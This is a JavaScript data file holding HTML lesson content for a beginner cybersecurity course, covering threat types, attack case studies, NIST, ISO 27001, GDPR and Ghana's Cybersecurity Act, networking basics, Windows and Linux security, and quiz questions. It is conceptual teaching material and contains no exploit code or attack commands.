import { Shield } from 'lucide-react';
import { echo, help, whoami, ls, clear, date, history } from './commands';

export const courseCategories =[
    {
        id: "cyber-fundamentals-beginner",
        title: "Cybersecurity Fundamentals Beginner",
        chapters: [
            {
                id: "module-1",
                title: 'Module 1:  Understanding Cybersecurity',
                icon: Shield,
                sections: [
                    {
                        title: 'Session 1: Part 1: What is Cybersecurity?',
                        content: `
                            
                                <h4 class="font-bold">Definition</h4>
                                <p class="mb-4">Cybersecurity refers to the practice of protecting systems, networks, and programs from digital attacks. These attacks aim to access, alter, or destroy sensitive information, extort money from users, or disrupt normal business operations.</p>
                                <h4 class="font-bold">Key Components of Cybersecurity</h4>
                                <ul class="pl-6 mb-6">
                                    <li><strong>Network Security:</strong> Protecting networks from intrusions, malware, and unauthorized access.</li>
                                    <li><strong>Application Security:</strong> Securing software and devices against threats.</li>
                                    <li><strong>Information Security:</strong> Ensuring data confidentiality, integrity, and availability.</li>
                                    <li><strong>Operational Security:</strong> Processes and decisions related to handling and protecting data assets.</li>
                                    <li><strong>Disaster Recovery & Business Continuity:</strong> Planning for security breaches and ensuring resilience.</li>
                                    <li><strong>End-User Education:</strong> Training users to recognize and prevent cyber threats.</li>
                                </ul>
                                <h4 class="font-bold">Real-World Example</h4>
                                <p class="mb-4">In 2021, Colonial Pipeline (USA) suffered a ransomware attack, causing a fuel supply crisis. The attackers demanded millions in cryptocurrency, highlighting the importance of cybersecurity in protecting critical infrastructure.</p>
                                <h4 class="font-bold">Practical Exercise</h4>
                                <ul class="pl-6 mb-6">
                                    <li>Research a recent cyber attack and write a short summary of what happened, how it was executed, and how it could have been prevented.</li>
                                </ul>
                            
                        `
                    },
                    {
                        title: 'Part 2: Importance of Cybersecurity',
                        content: `
                            
                                <h4 class="font-bold">Why is Cybersecurity Important?</h4>
                                <ul class="pl-6 mb-6">
                                    <li>Protects sensitive data (e.g., financial records, personal information, government secrets).</li>
                                    <li>Prevents financial losses due to fraud, ransomware, and hacking.</li>
                                    <li>Maintains business reputation and trust by securing customer data.</li>
                                    <li>Ensures compliance with cybersecurity laws and regulations.</li>
                                </ul>
                                <h4 class="font-bold">Industries Most Affected by Cyber Threats</h4>
                                <ul class="pl-6 mb-6">
                                    <li><strong>Banking & Finance:</strong> Targeted for financial fraud and identity theft.</li>
                                    <li><strong>Healthcare:</strong> Patient records are valuable on the black market.</li>
                                    <li><strong>E-commerce:</strong> Payment fraud and website hacking are common.</li>
                                    <li><strong>Government & Defense:</strong> High risk due to espionage and data leaks.</li>
                                    <li><strong>Education:</strong> Universities face intellectual property theft and data breaches.</li>
                                </ul>
                                <h4 class="font-bold">Real-World Example</h4>
                                <p class="mb-4">Equifax Data Breach (2017): Personal data of 147 million people was stolen due to poor cybersecurity practices, leading to a $700 million settlement.</p>
                                <h4 class="font-bold">Practical Task</h4>
                                <ul class="pl-6 mb-6">
                                    <li>Identify three potential cybersecurity threats in your own field or industry and describe their possible impact.</li>
                                </ul>
                            
                        `
                    },
                    {
                        title: 'Part 3: Cybersecurity vs. Information Security',
                        content: `
                            
                                <h4 class="font-bold">Key Differences</h4>
                                <table class="min-w-full border-collapse bg-white shadow-sm rounded-lg overflow-hidden mb-6">
                                    <thead>
                                        <tr class="bg-gray-100">
                                            <th class="px-6 py-3 text-left text-sm font-semibold text-gray-700 uppercase tracking-wider border-b">Aspect</th>
                                            <th class="px-6 py-3 text-left text-sm font-semibold text-gray-700 uppercase tracking-wider border-b">Cybersecurity</th>
                                            <th class="px-6 py-3 text-left text-sm font-semibold text-gray-700 uppercase tracking-wider border-b">Information Security</th>
                                        </tr>
                                    </thead>
                                    <tbody>
                                        <tr class="hover:bg-gray-50">
                                            <td class="px-6 py-4 text-sm text-gray-900 border-b">Definition</td>
                                            <td class="px-6 py-4 text-sm text-gray-900 border-b">Protects systems, networks, and data from cyber threats</td>
                                            <td class="px-6 py-4 text-sm text-gray-900 border-b">Protects information in any form (digital & physical)</td>
                                        </tr>
                                        <tr class="hover:bg-gray-50">
                                            <td class="px-6 py-4 text-sm text-gray-900 border-b">Focus</td>
                                            <td class="px-6 py-4 text-sm text-gray-900 border-b">Defending against hacking, malware, ransomware</td>
                                            <td class="px-6 py-4 text-sm text-gray-900 border-b">Ensuring data confidentiality, integrity, availability</td>
                                        </tr>
                                        <tr class="hover:bg-gray-50">
                                            <td class="px-6 py-4 text-sm text-gray-900 border-b">Scope</td>
                                            <td class="px-6 py-4 text-sm text-gray-900 border-b">Covers technology, processes, and security measures</td>
                                            <td class="px-6 py-4 text-sm text-gray-900 border-b">Covers policies, encryption, and access controls</td>
                                        </tr>
                                        <tr class="hover:bg-gray-50">
                                            <td class="px-6 py-4 text-sm text-gray-900">Example</td>
                                            <td class="px-6 py-4 text-sm text-gray-900">Preventing a DDoS attack on a website</td>
                                            <td class="px-6 py-4 text-sm text-gray-900">Encrypting sensitive business records</td>
                                        </tr>
                                    </tbody>
                                </table>

                                <h4 class="font-bold">Practical Task</h4>
                                <ul class="pl-6 mb-6">
                                    <li>Write a brief scenario where both cybersecurity and information security must be applied to prevent a security incident.</li>
                                </ul>
                            
                        `
                    },
                    {
                        title: 'Part 4: Cyber Threat Landscape',
                        content: `
                            <h4 class="font-bold">Common Cyber Threats</h4>
                            <ul class="pl-6 mb-6">
                                <li><strong>Malware:</strong> Viruses, worms, Trojans, ransomware</li>
                                <li><strong>Phishing:</strong> Emails and fake websites tricking users into giving credentials</li>
                                <li><strong>Ransomware:</strong> Encrypts files and demands payment to restore access</li>
                                <li><strong>DDoS Attacks:</strong> Overloading a system to make it unavailable</li>
                                <li><strong>Insider Threats:</strong> Employees or contractors leaking data or causing harm</li>
                                <li><strong>Zero-Day Exploits:</strong> Attacks exploiting undisclosed vulnerabilities</li>
                            </ul>
                    
                            <h4 class="font-bold">Emerging Threats</h4>
                            <ul class="pl-6 mb-6">
                                <li><strong>AI-Powered Cyber Attacks:</strong> Hackers using artificial intelligence to automate attacks</li>
                                <li><strong>Deepfake Scams:</strong> Fake videos/audio used for fraud</li>
                                <li><strong>Supply Chain Attacks:</strong> Attacks targeting vendors to compromise businesses</li>
                            </ul>
                    
                            <h4 class="font-bold">Real-World Example</h4>
                            <p class="mb-4">WannaCry Ransomware (2017): Exploited a Windows vulnerability to infect thousands of organizations worldwide, including hospitals and businesses.</p>
                    
                            <h4 class="font-bold">Practical Task</h4>
                            <ul class="pl-6 mb-6">
                                <li>Research and list 5 new cyber threats that emerged in the past year. Explain their impact and how they can be prevented.</li>
                            </ul>
                        `
                    },
                    {
                        title: 'Part 5: Session 1 Assessment',
                        content: `
                            <h4 class="font-bold">Multiple Choice Questions (MCQs)</h4>
                            <ul class="pl-6 mb-6">
                                <li class="mb-4">
                                    <p class="font-semibold">What is the main difference between cybersecurity and information security?</p>
                                    <div class="ml-4 mt-2">
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q1" class="mr-2"> <span>a) Scope of protection</span>
                                        </div>
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q1" class="mr-2"> <span>b) Implementation methods</span>
                                        </div>
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q1" class="mr-2"> <span>c) Types of threats addressed</span>
                                        </div>
                                        <div class="flex items-center">
                                            <input type="radio" name="q1" class="mr-2"> <span>d) Technology requirements</span>
                                        </div>
                                    </div>
                                </li>
                                <li class="mb-4">
                                    <p class="font-semibold">Which of the following is NOT a common cybersecurity threat?</p>
                                    <div class="ml-4 mt-2">
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q2" class="mr-2"> <span>a) Phishing</span>
                                        </div>
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q2" class="mr-2"> <span>b) Malware</span>
                                        </div>
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q2" class="mr-2"> <span>c) DDoS Attack</span>
                                        </div>
                                        <div class="flex items-center">
                                            <input type="radio" name="q2" class="mr-2"> <span>d) Email Marketing</span>
                                        </div>
                                    </div>
                                </li>
                                <li class="mb-4">
                                    <p class="font-semibold">What was the primary cause of the Equifax Data Breach?</p>
                                    <div class="ml-4 mt-2">
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q3" class="mr-2"> <span>a) Unpatched vulnerability</span>
                                        </div>
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q3" class="mr-2"> <span>b) Social engineering</span>
                                        </div>
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q3" class="mr-2"> <span>c) Insider threat</span>
                                        </div>
                                        <div class="flex items-center">
                                            <input type="radio" name="q3" class="mr-2"> <span>d) Password breach</span>
                                        </div>
                                    </div>
                                </li>
                            </ul>
                    
                            <h4 class="font-bold">Short Answer Questions</h4>
                            <ul class="pl-6 mb-6">
                                <li class="mb-4">
                                    <p class="font-semibold">Describe a real-world cybersecurity incident and how it could have been prevented.</p>
                                    <textarea class="w-full p-2 mt-2 border rounded-md" rows="4"></textarea>
                                </li>
                                <li class="mb-4">
                                    <p class="font-semibold">What are three key cybersecurity challenges organizations face today?</p>
                                    <textarea class="w-full p-2 mt-2 border rounded-md" rows="4"></textarea>
                                </li>
                            </ul>
                    
                            <h4 class="font-bold">Hands-on Task</h4>
                            <div class="pl-6 mb-6">
                                <p class="mb-2">Use online cybersecurity news sources (e.g., Cybersecurity News, Threatpost) to identify three latest cyber-attacks and summarize them.</p>
                                <textarea class="w-full p-2 mt-2 border rounded-md" rows="6"></textarea>
                            </div>
                        `
                    },
                    {
                        title: 'Session 2: Part 1: Common Cyber Threats',
                        content: `
                            <h4 class="font-bold">Types of Cyber Threats</h4>
                            <ul class="pl-6 mb-6">
                                <li><strong>Malware:</strong>
                                    <ul class="pl-6">
                                        <li>Viruses: Attach themselves to legitimate programs and replicate</li>
                                        <li>Worms: Spread autonomously across networks</li>
                                        <li>Trojans: Disguise as legitimate software but execute malicious actions</li>
                                        <li>Spyware: Secretly monitors user activity</li>
                                    </ul>
                                </li>
                                <li><strong>Phishing:</strong>
                                    <ul class="pl-6">
                                        <li>Email Phishing: Fake emails impersonating trusted entities</li>
                                        <li>Spear Phishing: Targeted attacks on specific individuals or organizations</li>
                                        <li>Vishing & Smishing: Phishing via phone calls and SMS messages</li>
                                    </ul>
                                </li>
                            </ul>
                            <h4 class="font-bold">Practical Task</h4>
                            <ul class="pl-6 mb-6">
                                <li>Research a recent malware or phishing attack and write a summary of how it worked and its impact.</li>
                            </ul>
                        `
                    },
                    {
                        title: 'Part 2: Social Engineering Attacks',
                        content: `
                            <h4 class="font-bold">Understanding Social Engineering</h4>
                            <p class="mb-4">Social engineering manipulates human psychology to gain unauthorized access to data or systems.</p>
                            <ul class="pl-6 mb-6">
                                <li><strong>Pretexting:</strong> Creating a fabricated scenario to obtain sensitive data</li>
                                <li><strong>Baiting:</strong> Offering something enticing (e.g., fake USB drive with malware)</li>
                                <li><strong>Quid Pro Quo:</strong> Offering services or benefits in exchange for information</li>
                                <li><strong>Tailgating & Piggybacking:</strong> Physically following someone to gain access</li>
                            </ul>
                            <h4 class="font-bold">Real-World Example</h4>
                            <p class="mb-4">Twitter Hack (2020): Attackers used social engineering to gain access to internal systems and take over high-profile accounts.</p>
                        `
                    },
                    {
                        title: 'Part 3: Attack Lifecycle',
                        content: `
                            <h4 class="font-bold">Stages of a Cyber Attack</h4>
                            <ul class="pl-6 mb-6">
                                <li><strong>Reconnaissance:</strong>
                                    <ul class="pl-6">
                                        <li>Open-source intelligence (OSINT)</li>
                                        <li>Social media profiling</li>
                                        <li>Scanning for vulnerabilities</li>
                                    </ul>
                                </li>
                                <li><strong>Exploitation:</strong>
                                    <ul class="pl-6">
                                        <li>Exploiting unpatched software</li>
                                        <li>Password cracking</li>
                                        <li>Social engineering techniques</li>
                                    </ul>
                                </li>
                                <li><strong>Exfiltration:</strong>
                                    <ul class="pl-6">
                                        <li>Data theft (customer records, trade secrets)</li>
                                        <li>Encryption (Ransomware attacks)</li>
                                        <li>Deleting or modifying critical data</li>
                                    </ul>
                                </li>
                            </ul>
                            <h4 class="font-bold">Practical Task</h4>
                            <ul class="pl-6 mb-6">
                                <li>Use Nmap to scan a local test network for vulnerabilities and document the findings.</li>
                            </ul>
                        `
                    },
                    {
                        title: 'Part 4: Case Studies of Real Cyber Attacks',
                        content: `
                            <h4 class="font-bold">Notable Cyber Attacks & Lessons Learned</h4>
                            <ul class="pl-6 mb-6">
                                <li><strong>Equifax Data Breach (2017):</strong> Poor patch management led to the exposure of 147 million records.</li>
                                <li><strong>Sony Hack (2014):</strong> State-sponsored cyber attack that leaked confidential emails and movies.</li>
                                <li><strong>Target POS Attack (2013):</strong> Credit card data breach due to compromised vendor credentials.</li>
                                <li><strong>SolarWinds Supply Chain Attack (2020):</strong> Nation-state actors exploited software updates to infiltrate businesses and government networks.</li>
                            </ul>
                            <h4 class="font-bold">Practical Task</h4>
                            <ul class="pl-6 mb-6">
                                <li>Choose one of the case studies and analyze:
                                    <ul class="pl-6">
                                        <li>How the attack happened</li>
                                        <li>What security failures were exploited</li>
                                        <li>Steps that could have prevented the attack</li>
                                    </ul>
                                </li>
                            </ul>
                        `
                    },
                    {
                        title: 'Part 5: Session 2 Assessment',
                        content: `
                            <h4 class="font-bold">Multiple Choice Questions (MCQs)</h4>
                            <ul class="pl-6 mb-6">
                                <li class="mb-4">
                                    <p class="font-semibold">What is the primary method used in phishing attacks?</p>
                                    <div class="ml-4 mt-2">
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q1" class="mr-2"> <span>a) Malware infection</span>
                                        </div>
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q1" class="mr-2"> <span>b) Social engineering</span>
                                        </div>
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q1" class="mr-2"> <span>c) DDoS flooding</span>
                                        </div>
                                        <div class="flex items-center">
                                            <input type="radio" name="q1" class="mr-2"> <span>d) Code injection</span>
                                        </div>
                                    </div>
                                </li>
                            </ul>
                            <h4 class="font-bold">Short Answer Questions</h4>
                            <ul class="pl-6 mb-6">
                                <li class="mb-4">
                                    <p class="font-semibold">Explain how a DDoS attack can impact a business.</p>
                                    <textarea class="w-full p-2 mt-2 border rounded-md" rows="4"></textarea>
                                </li>
                                <li class="mb-4">
                                    <p class="font-semibold">How can organizations protect against social engineering attacks?</p>
                                    <textarea class="w-full p-2 mt-2 border rounded-md" rows="4"></textarea>
                                </li>
                            </ul>
                            <h4 class="font-bold">Hands-on Task</h4>
                            <div class="pl-6 mb-6">
                                <p class="mb-2">Set up a virtual lab and perform a phishing attack simulation using a phishing toolkit.</p>
                                <textarea class="w-full p-2 mt-2 border rounded-md" rows="6"></textarea>
                            </div>
                        `
                    },
                    {
                        title: 'Session 3: Part 1: NIST Cybersecurity Framework',
                        content: `
                            <h4 class="font-bold">What is the NIST Cybersecurity Framework?</h4>
                            <p class="mb-4">The National Institute of Standards and Technology (NIST) Cybersecurity Framework is a voluntary framework that provides organizations with a structured approach to managing cybersecurity risks.</p>
                            
                            <h4 class="font-bold">Core Components of NIST Framework</h4>
                            <ul class="pl-6 mb-6">
                                <li><strong>Identify:</strong> Understanding and managing cybersecurity risks</li>
                                <li><strong>Protect:</strong> Implementing security measures to prevent attacks</li>
                                <li><strong>Detect:</strong> Identifying cybersecurity events and incidents</li>
                                <li><strong>Respond:</strong> Containing and mitigating the impact of incidents</li>
                                <li><strong>Recover:</strong> Restoring normal operations after an incident</li>
                            </ul>
            
                            <h4 class="font-bold">Practical Task</h4>
                            <ul class="pl-6 mb-6">
                                <li>Identify which NIST framework function your organization is strongest and weakest in. Suggest improvements for the weakest area.</li>
                            </ul>
                        `
                    },
                    {
                        title: 'Part 2: ISO 27001: Information Security Management System',
                        content: `
                            <h4 class="font-bold">What is ISO 27001?</h4>
                            <p class="mb-4">ISO 27001 is an international standard for Information Security Management Systems (ISMS). It provides a systematic approach to managing sensitive company information to ensure data security.</p>
            
                            <h4 class="font-bold">Key Requirements of ISO 27001</h4>
                            <ul class="pl-6 mb-6">
                                <li><strong>Risk Assessment & Management:</strong> Identifying security threats and taking preventive measures</li>
                                <li><strong>Access Control Policies:</strong> Ensuring that only authorized individuals access sensitive data</li>
                                <li><strong>Security Awareness & Training:</strong> Educating employees on cybersecurity best practices</li>
                                <li><strong>Incident Response Planning:</strong> Preparing for and mitigating security breaches</li>
                            </ul>
            
                            <h4 class="font-bold">Practical Task</h4>
                            <ul class="pl-6 mb-6">
                                <li>Perform a basic risk assessment for your organization using ISO 27001 principles.</li>
                            </ul>
                        `
                    },
                    {
                        title: 'Part 3: GDPR, HIPAA, and PCI-DSS Compliance',
                        content: `
                            <h4 class="font-bold">General Data Protection Regulation (GDPR)</h4>
                            <ul class="pl-6 mb-6">
                                <li>A European Union regulation designed to protect personal data privacy</li>
                                <li>Requires businesses to obtain explicit user consent before processing personal data</li>
                                <li>Enforces strict data breach reporting requirements</li>
                                <li>Heavy fines for non-compliance (up to 4% of global revenue)</li>
                            </ul>
            
                            <h4 class="font-bold">HIPAA & PCI-DSS</h4>
                            <ul class="pl-6 mb-6">
                                <li><strong>HIPAA:</strong>
                                    <ul class="pl-6">
                                        <li>U.S. regulation that protects health information</li>
                                        <li>Requires data encryption, access control, and audit trails</li>
                                    </ul>
                                </li>
                                <li><strong>PCI-DSS:</strong>
                                    <ul class="pl-6">
                                        <li>Standard designed to secure credit card transactions</li>
                                        <li>Requires encryption of payment data</li>
                                        <li>Enforces multi-factor authentication (MFA)</li>
                                    </ul>
                                </li>
                            </ul>
                        `
                    },
                    {
                        title: 'Part 4: Ghana\'s Cybersecurity Act',
                        content: `
                            <h4 class="font-bold">Overview</h4>
                            <p class="mb-4">Ghana's Cybersecurity Act 2020 provides a legal framework to regulate cybersecurity activities, ensure digital safety, and protect critical information infrastructure.</p>
            
                            <h4 class="font-bold">Key Provisions</h4>
                            <ul class="pl-6 mb-6">
                                <li><strong>Cybersecurity Authority:</strong> Responsible for implementing and enforcing cybersecurity policies</li>
                                <li><strong>Data Protection and Privacy:</strong> Mandates organizations to secure personal data</li>
                                <li><strong>Critical Information Infrastructure Protection (CIIP):</strong> Ensures security measures for essential digital services</li>
                                <li><strong>Cybercrime Provisions:</strong> Outlines penalties for cyber offenses such as hacking, identity theft, and online fraud</li>
                            </ul>
                        `
                    },
                    {
                        title: 'Part 5: Session 3 Assessment',
                        content: `
                            <h4 class="font-bold">Multiple Choice Questions (MCQs)</h4>
                            <ul class="pl-6 mb-6">
                                <li class="mb-4">
                                    <p class="font-semibold">Which of the following is NOT covered under ISO 27001?</p>
                                    <div class="ml-4 mt-2">
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q1" class="mr-2"> <span>a) Access Control</span>
                                        </div>
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q1" class="mr-2"> <span>b) Employee Salaries</span>
                                        </div>
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q1" class="mr-2"> <span>c) Risk Management</span>
                                        </div>
                                        <div class="flex items-center">
                                            <input type="radio" name="q1" class="mr-2"> <span>d) Incident Response</span>
                                        </div>
                                    </div>
                                </li>
                            </ul>
            
                            <h4 class="font-bold">Short Answer Questions</h4>
                            <ul class="pl-6 mb-6">
                                <li class="mb-4">
                                    <p class="font-semibold">Explain the difference between HIPAA and PCI-DSS compliance.</p>
                                    <textarea class="w-full p-2 mt-2 border rounded-md" rows="4"></textarea>
                                </li>
                                <li class="mb-4">
                                    <p class="font-semibold">Why is cybersecurity compliance important for businesses?</p>
                                    <textarea class="w-full p-2 mt-2 border rounded-md" rows="4"></textarea>
                                </li>
                            </ul>
                        `
                    },
                    {
                        title: 'Session 4: Part 1: TCP/IP and OSI Model',
                        content: `
                            <h4 class="font-bold">What is TCP/IP?</h4>
                            <p class="mb-4">The Transmission Control Protocol/Internet Protocol (TCP/IP) is the foundational communication model used for networking and the internet.</p>
            
                            <h4 class="font-bold">Layers of TCP/IP Model</h4>
                            <ul class="pl-6 mb-6">
                                <li><strong>Application Layer:</strong> HTTP, HTTPS, FTP, DNS, SSH</li>
                                <li><strong>Transport Layer:</strong> TCP, UDP</li>
                                <li><strong>Internet Layer:</strong> IP, ICMP</li>
                                <li><strong>Network Access Layer:</strong> Ethernet, Wi-Fi</li>
                            </ul>
            
                            <h4 class="font-bold">OSI Model</h4>
                            <ul class="pl-6 mb-6">
                                <li><strong>Physical:</strong> Cables, switches</li>
                                <li><strong>Data Link:</strong> MAC addresses, ARP</li>
                                <li><strong>Network:</strong> Routing, IP addresses</li>
                                <li><strong>Transport:</strong> TCP/UDP</li>
                                <li><strong>Session:</strong> Communication setup</li>
                                <li><strong>Presentation:</strong> Data formatting, encryption</li>
                                <li><strong>Application:</strong> User interfaces</li>
                            </ul>
            
                            <h4 class="font-bold">Practical Task</h4>
                            <ul class="pl-6 mb-6">
                                <li>Use the ping and traceroute commands to analyze network communication between two devices.</li>
                            </ul>
                        `
                    },
                    {
                        title: 'Part 2: Common Network Protocols',
                        content: `
                            <h4 class="font-bold">Key Protocols and Their Roles</h4>
                            <ul class="pl-6 mb-6">
                                <li><strong>HTTP & HTTPS:</strong> Web browsing, secure communication</li>
                                <li><strong>FTP:</strong> Transferring files between systems</li>
                                <li><strong>DNS:</strong> Resolving domain names to IP addresses</li>
                                <li><strong>SSH:</strong> Secure remote access to systems</li>
                                <li><strong>SMTP & IMAP:</strong> Email communication protocols</li>
                            </ul>
            
                            <h4 class="font-bold">Practical Task</h4>
                            <ul class="pl-6 mb-6">
                                <li>Capture and analyze HTTP vs. HTTPS traffic using Wireshark.</li>
                            </ul>
                        `
                    },
                    {
                        title: 'Part 3: Network Topologies',
                        content: `
                            <h4 class="font-bold">Types of Network Topologies</h4>
                            <ul class="pl-6 mb-6">
                                <li><strong>Bus Topology:</strong> Single backbone cable</li>
                                <li><strong>Star Topology:</strong> Central hub/switch connecting devices</li>
                                <li><strong>Ring Topology:</strong> Each device connected to two others</li>
                                <li><strong>Mesh Topology:</strong> Every device connects to multiple others for redundancy</li>
                                <li><strong>Hybrid Topology:</strong> Combination of two or more topologies</li>
                            </ul>
            
                            <h4 class="font-bold">Practical Task</h4>
                            <ul class="pl-6 mb-6">
                                <li>Draw and explain the network topology of your home or workplace.</li>
                            </ul>
                        `
                    },
                    {
                        title: 'Part 4: Introduction to Firewalls & Proxies',
                        content: `
                            <h4 class="font-bold">Firewalls</h4>
                            <p class="mb-4">Purpose: Control inbound/outbound traffic based on security rules.</p>
                            <ul class="pl-6 mb-6">
                                <li><strong>Types:</strong>
                                    <ul class="pl-6">
                                        <li>Packet Filtering Firewalls</li>
                                        <li>Stateful Inspection Firewalls</li>
                                        <li>Next-Generation Firewalls (NGFWs)</li>
                                    </ul>
                                </li>
                            </ul>
            
                            <h4 class="font-bold">Proxies</h4>
                            <p class="mb-4">Act as intermediaries between users and the internet.</p>
                            <ul class="pl-6 mb-6">
                                <li><strong>Types:</strong>
                                    <ul class="pl-6">
                                        <li>Forward Proxies - Hide the client's IP address</li>
                                        <li>Reverse Proxies - Protect servers by handling incoming requests</li>
                                    </ul>
                                </li>
                            </ul>
                        `
                    },
                    {
                        title: 'Part 5: Session 4 Assessment',
                        content: `
                            <h4 class="font-bold">Multiple Choice Questions (MCQs)</h4>
                            <ul class="pl-6 mb-6">
                                <li class="mb-4">
                                    <p class="font-semibold">What protocol is used for secure remote access?</p>
                                    <div class="ml-4 mt-2">
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q1" class="mr-2"> <span>a) FTP</span>
                                        </div>
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q1" class="mr-2"> <span>b) SSH</span>
                                        </div>
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q1" class="mr-2"> <span>c) DNS</span>
                                        </div>
                                        <div class="flex items-center">
                                            <input type="radio" name="q1" class="mr-2"> <span>d) HTTP</span>
                                        </div>
                                    </div>
                                </li>
                            </ul>
            
                            <h4 class="font-bold">Short Answer Questions</h4>
                            <ul class="pl-6 mb-6">
                                <li class="mb-4">
                                    <p class="font-semibold">Compare and contrast TCP vs. UDP.</p>
                                    <textarea class="w-full p-2 mt-2 border rounded-md" rows="4"></textarea>
                                </li>
                                <li class="mb-4">
                                    <p class="font-semibold">Why is HTTPS preferred over HTTP?</p>
                                    <textarea class="w-full p-2 mt-2 border rounded-md" rows="4"></textarea>
                                </li>
                            </ul>
            
                            <h4 class="font-bold">Hands-on Task</h4>
                            <div class="pl-6 mb-6">
                                <p class="mb-2">Set up a simple packet filtering firewall rule and test it using a network scanning tool like Nmap.</p>
                                <textarea class="w-full p-2 mt-2 border rounded-md" rows="6"></textarea>
                            </div>
                        `
                    },
                    {
                        title: 'Session 5: Part 1: Windows vs. Linux Security',
                        content: `
                            <h4 class="font-bold">Windows Security Overview</h4>
                            <ul class="pl-6 mb-6">
                                <li><strong>Pros:</strong>
                                    <ul class="pl-6">
                                        <li>User-friendly interface</li>
                                        <li>Extensive enterprise support</li>
                                        <li>Regular security updates and patches</li>
                                    </ul>
                                </li>
                                <li><strong>Cons:</strong>
                                    <ul class="pl-6">
                                        <li>More targeted by malware and cyber threats</li>
                                        <li>Vulnerable to privilege escalation attacks</li>
                                        <li>Closed-source nature limits transparency</li>
                                    </ul>
                                </li>
                            </ul>
            
                            <h4 class="font-bold">Linux Security Overview</h4>
                            <ul class="pl-6 mb-6">
                                <li><strong>Pros:</strong>
                                    <ul class="pl-6">
                                        <li>Open-source nature allows for community-driven security enhancements</li>
                                        <li>Strong built-in permissions and user privilege management</li>
                                        <li>Fewer viruses and malware compared to Windows</li>
                                    </ul>
                                </li>
                                <li><strong>Cons:</strong>
                                    <ul class="pl-6">
                                        <li>Steeper learning curve for beginners</li>
                                        <li>Less enterprise software support</li>
                                        <li>Potential security misconfigurations due to manual settings</li>
                                    </ul>
                                </li>
                            </ul>
                        `
                    },
                    {
                        title: 'Part 2: Introduction to Linux CLI for Cybersecurity',
                        content: `
                            <h4 class="font-bold">Why Use the Linux CLI?</h4>
                            <ul class="pl-6 mb-6">
                                <li>Offers precise control over system security</li>
                                <li>Provides powerful tools for penetration testing and system hardening</li>
                                <li>Used by ethical hackers and security professionals worldwide</li>
                            </ul>
            
                            <h4 class="font-bold">Essential Linux Commands for Security</h4>
                            <ul class="pl-6 mb-6">
                                <li><strong>File & Directory Management:</strong> ls, cd, mkdir, rm, find</li>
                                <li><strong>User & Permissions Management:</strong> whoami, chmod, chown, passwd</li>
                                <li><strong>Network Security:</strong> ifconfig, netstat, iptables, nmap</li>
                                <li><strong>Process Monitoring:</strong> top, ps, kill, htop</li>
                                <li><strong>System Logs Analysis:</strong> journalctl, cat /var/log/syslog</li>
                            </ul>
                        `
                    },
                    {
                        title: 'Part 3: Windows Security Features',
                        content: `
                            <h4 class="font-bold">BitLocker</h4>
                            <ul class="pl-6 mb-6">
                                <li>Encrypts entire hard drives to prevent unauthorized access</li>
                                <li>Requires TPM (Trusted Platform Module) for enhanced security</li>
                                <li>Protects against data theft in case of device loss</li>
                            </ul>
            
                            <h4 class="font-bold">User Account Control (UAC)</h4>
                            <ul class="pl-6 mb-6">
                                <li>Prevents unauthorized changes to system settings</li>
                                <li>Helps mitigate malware by limiting administrator privileges</li>
                                <li>Can be configured for different security levels</li>
                            </ul>
            
                            <h4 class="font-bold">Windows Defender</h4>
                            <ul class="pl-6 mb-6">
                                <li>Built-in antivirus and anti-malware protection</li>
                                <li>Features real-time protection and cloud-based threat analysis</li>
                                <li>Includes Windows Defender Firewall to block unauthorized network traffic</li>
                            </ul>
                        `
                    },
                    {
                        title: 'Part 4: Session 5 Assessment',
                        content: `
                            <h4 class="font-bold">Multiple Choice Questions (MCQs)</h4>
                            <ul class="pl-6 mb-6">
                                <li class="mb-4">
                                    <p class="font-semibold">What command is used in Linux to change file permissions?</p>
                                    <div class="ml-4 mt-2">
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q1" class="mr-2"> <span>a) chmod</span>
                                        </div>
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q1" class="mr-2"> <span>b) ls</span>
                                        </div>
                                        <div class="flex items-center mb-2">
                                            <input type="radio" name="q1" class="mr-2"> <span>c) passwd</span>
                                        </div>
                                        <div class="flex items-center">
                                            <input type="radio" name="q1" class="mr-2"> <span>d) netstat</span>
                                        </div>
                                    </div>
                                </li>
                            </ul>
            
                            <h4 class="font-bold">Short Answer Questions</h4>
                            <ul class="pl-6 mb-6">
                                <li class="mb-4">
                                    <p class="font-semibold">How does User Account Control (UAC) improve Windows security?</p>
                                    <textarea class="w-full p-2 mt-2 border rounded-md" rows="4"></textarea>
                                </li>
                                <li class="mb-4">
                                    <p class="font-semibold">What are three Linux security commands every cybersecurity professional should know?</p>
                                    <textarea class="w-full p-2 mt-2 border rounded-md" rows="4"></textarea>
                                </li>
                            </ul>
            
                            <h4 class="font-bold">Hands-on Task</h4>
                            <div class="pl-6 mb-6">
                                <p class="mb-2">Perform a security hardening task on both Windows and Linux and document the process.</p>
                                <textarea class="w-full p-2 mt-2 border rounded-md" rows="6"></textarea>
                            </div>
                        `
                    },
                    {
                        title: 'Session 6: Part 1: Secure Password Management',
                        content: `
                            <h4 class="font-bold">Why Password Security Matters?</h4>
                            <ul class="pl-6 mb-6">
                                <li>Weak or compromised passwords are a leading cause of cyber breaches</li>
                                <li>Attackers use brute force, credential stuffing, and phishing to steal passwords</li>
                            </ul>
            
                            <h4 class="font-bold">Best Practices for Strong Passwords</h4>
                            <ul class="pl-6 mb-6">
                                <li>Use at least 12-16 characters with a mix of uppercase, lowercase, numbers, and symbols</li>
                                <li>Avoid common passwords like 123456, password, or admin123</li>
                                <li>Never reuse passwords across multiple accounts</li>
                                <li>Use password managers to generate and store strong passwords securely</li>
                            </ul>
            
